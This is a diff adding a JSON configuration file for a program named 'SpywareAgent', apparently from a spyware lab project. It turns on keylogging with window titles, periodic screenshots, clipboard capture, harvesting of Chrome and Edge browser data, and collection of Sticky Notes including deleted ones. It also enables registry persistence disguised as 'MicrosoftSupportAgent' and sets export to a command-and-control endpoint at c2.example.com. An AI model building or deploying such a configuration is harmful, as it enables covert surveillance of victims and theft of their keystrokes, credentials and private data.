@@ -1,0 +1,93 @@
+{
+  "agentName": "SpywareAgent",
+  "agentId": "0f4c8b1a9e7d4f2f8f5a1c2b3d4e5f60",
+  "mutexSeed": "SpywareLab.SpywareAgent",
+  "persistence": {
+    "enabled": true,
+    "registryValueName": "MicrosoftSupportAgent",
+    "startupFolder": false
+  },
+  "screenshot": {
+    "enabled": true,
+    "intervalSeconds": 60,
+    "jitterSeconds": 10,
+    "jpegQuality": 75,
+    "maxWidth": 1280,
+    "maxHeight": 720,
+    "skipDuplicates": true,
+    "captureOnLockedDesktop": false
+  },
+  "clipboard": {
+    "enabled": true,
+    "maxTextLength": 100000,
+    "captureImages": true,
+    "captureHtml": false,
+    "captureFiles": true,
+    "saveTextCopy": false,
+    "debounceMilliseconds": 400,
+    "skipDuplicates": true
+  },
+  "browsers": {
+    "enabled": true,
+    "intervalMinutes": 15,
+    "jitterSeconds": 60,
+    "chrome": true,
+    "edge": true,
+    "maxResultsPerRun": 1000,
+    "keepEncryptedBlob": true,
+    "skipUnchanged": true,
+    "writeDumpFile": false
+  },
+  "keyboard": {
+    "enabled": true,
+    "idleFlushMilliseconds": 1500,
+    "maxBufferCharacters": 2000,
+    "maxTextLength": 100000,
+    "recordSpecialKeys": true,
+    "gapMarkerSeconds": 30,
+    "recordWindowTitles": true,
+    "honorBackspace": true,
+    "saveTextCopy": false,
+    "skipDuplicates": false,
+    "captureOnFocusChange": true,
+    "focusCaptureMinimumSeconds": 3
+  },
+  "notes": {
+    "enabled": true,
+    "intervalMinutes": 15,
+    "jitterSeconds": 60,
+    "stickyNotes": true,
+    "legacySnt": true,
+    "includeDeleted": true,
+    "skipUnchanged": true,
+    "saveTextCopy": false,
+    "maxTextLength": 20000,
+    "maxResultsPerRun": 200,
+    "writeDumpFile": false
+  },
+  "transport": {
+    "enabled": true,
+    "mode": "local",
+    "flushIntervalSeconds": 30,
+    "batchSize": 25,
+    "includeImagesInExport": true,
+    "endpoint": "https://c2.example.com/collect",
+    "apiKey": "",
+    "timeoutSeconds": 15,
+    "retryMinutes": [1, 5, 15],
+    "allowUntrustedTlsCertificate": false
+  },
+  "storage": {
+    "maxDays": 7,
+    "maxSizeMb": 500,
+    "pruneIntervalMinutes": 60,
+    "encryptLocalData": false,
+    "deleteAfterExport": false
+  },
+  "logging": {
+    "level": "Information",
+    "maxLogFileMb": 5,
+    "maxLogFiles": 3,
+    "mirrorToConsole": false
+  }
+}
